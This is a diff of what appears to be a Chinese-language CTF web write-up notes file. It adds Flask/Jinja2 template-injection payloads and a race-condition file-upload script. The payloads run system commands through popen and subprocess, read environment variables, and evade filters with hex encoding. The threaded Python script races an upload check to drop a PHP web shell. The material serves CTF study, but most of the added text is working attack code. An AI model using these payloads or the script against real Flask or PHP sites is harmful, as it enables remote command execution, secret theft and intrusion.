@@ -86,7 +86,6 @@ for i in range(300,1000):
         print(i)
         break 
 ```
-
   - 当flask的{{}}被过滤时，可以用{%%}来绕过过滤。例题:[[GWCTF 2019]你的名字](https://blog.csdn.net/cjdgg/article/details/119813547),更多绕过方式可参考[此处](https://blog.csdn.net/miuzzx/article/details/110220425)
   - 最简单的getshell payload(配合eval): `__import__("os").popen("ls").read()`，来源:[[watevrCTF-2019]Supercalc](https://blog.csdn.net/a3320315/article/details/104272833)
   - 能发现flask注入需要大量`.`,`_`，如果被过滤了可以用`[]`替代`.`，16进制编码替代`_`。例如`{{()."__class__"."__bases__"[0]."__subclasses__"()[91]["get_data"](0, "/proc/self/fd/3")}}`绕过过滤的写法就是`{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}`。例题:[[pasecactf_2019]flask_ssti](https://blog.csdn.net/qq_40800734/article/details/107011638)
@@ -107,6 +106,11 @@ for i in range(300,1000):
     res = requests.post(url,data=d).text 
     print(res)
     ```
+- `url_for.__globals__.os.__dict__.popen(request.args.file).read()`，然后传参file，内容为要执行的命令
+- `url_for.__globals__.os.environ`,拿环境变量
+- `config.__class__.from_envvar.__globals__.__builtins__.__import__(request.args.a).getenv(request.args.b)`，参数a是要导入的模块（os），参数b是环境变量名（把getenv换了就能执行别的了）
+- `().__class__.mro()[1].__subclasses__()[337](get_flashed_messages.__class__.__mro__[1].__subclasses__()[3]((0x65,0x78,0x70,0x6f,0x72,0x74)).decode(),shell=True,stdout=-1).communicate()[0].strip()`
+- `().__class__.__base__.__subclasses__()[148]()._module.__builtins__[request.args.b](request.args.c).environ`
 
 - [更多模板注入payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 
@@ -2062,3 +2066,50 @@ def req(path):
   - 报错注入解法使用的updatexml最多只能显示32位，需要搭配substr，reverse或mid（跟substr感觉差不多）获取完整flag。
   - 蚁剑版本不同，开堆叠写shell后连接sql数据库的结果也不同。蚁剑要是不行就用冰蝎的导出功能。
 - thinkphp可通过输入不存在的控制器获取版本。`http://xxx.com/index.php/aaa`
+227. [wzsc_文件上传](https://blog.csdn.net/qq_45608153/article/details/126312379)
+- 文件上传条件竞争。服务器检测上传文件的后缀时，使用白名单会比黑名单过滤效果更好。但业务逻辑不能是“上传文件->服务器保存文件->保存后检测刚刚保存文件的后缀，如果不在百名单就删除“。这样容易出现条件竞争。在服务器保存和删除的间隙中，文件是可访问的。
+```py
+import threading
+import os
+import requests
+
+class RaceCondition(threading.Thread):
+    def __init__(self,url,fileName):
+        threading.Thread.__init__(self)
+        self.baseUrl=url
+        self.fileUrl = self.baseUrl+'/upload/a.php'
+        self.shellUrl =self.baseUrl+'/upload/shell.php'
+        self.fileName=fileName
+
+    def _get(self):
+        r = requests.get(self.fileUrl)
+        if r.status_code == 200:
+            print('[*] create file shell.php success.')
+            os._exit(0)
+
+    def _upload(self):
+        rs = requests.get(self.shellUrl)
+        if rs.status_code == 200:
+            print('[*] create file shell.php success.')
+            os._exit(0)
+
+    def run(self):
+        while True:
+            self.upload_file()
+            self._get()
+            self._upload()
+    def upload_file(self):
+        file = open(self.fileName, "rb")
+        files = {"file": file}
+        res=requests.post(self.baseUrl+"/upload.php",files=files)
+
+if __name__ == '__main__':
+    threads = 50
+
+    for i in range(threads):
+        t = RaceCondition("","")
+        t.start()
+
+    for i in range(threads):
+        t.join()
+```
